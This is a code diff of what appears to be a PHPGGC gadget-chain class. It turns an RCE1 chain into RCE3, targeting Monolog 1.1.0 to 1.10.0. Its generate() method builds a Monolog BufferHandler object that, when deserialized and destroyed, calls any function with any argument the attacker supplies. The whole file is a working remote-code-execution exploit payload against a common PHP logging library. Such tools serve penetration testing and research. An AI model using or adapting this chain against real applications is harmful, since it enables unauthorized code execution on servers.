@@ -2,22 +2,20 @@
 
 namespace GadgetChain\Monolog;
 
-class RCE1 extends \PHPGGC\GadgetChain\RCE
+class RCE3 extends \PHPGGC\GadgetChain\RCE
 {
-    public static $version = '1.18 <= 2.0.2';
+    public static $version = '1.1.0 <= 1.10.0';
     public static $vector = '__destruct';
-    public static $author = 'cf';
+    public static $author = 'theBumble';
 
     public function generate(array $parameters)
     {
         $function = $parameters['function'];
         $parameter = $parameters['parameter'];
 
-        return new \Monolog\Handler\SyslogUdpHandler(
-            new \Monolog\Handler\BufferHandler(
+        return new \Monolog\Handler\BufferHandler(
                 ['current', $function],
                 [$parameter, 'level' => null]
-            )
         );
     }
 }
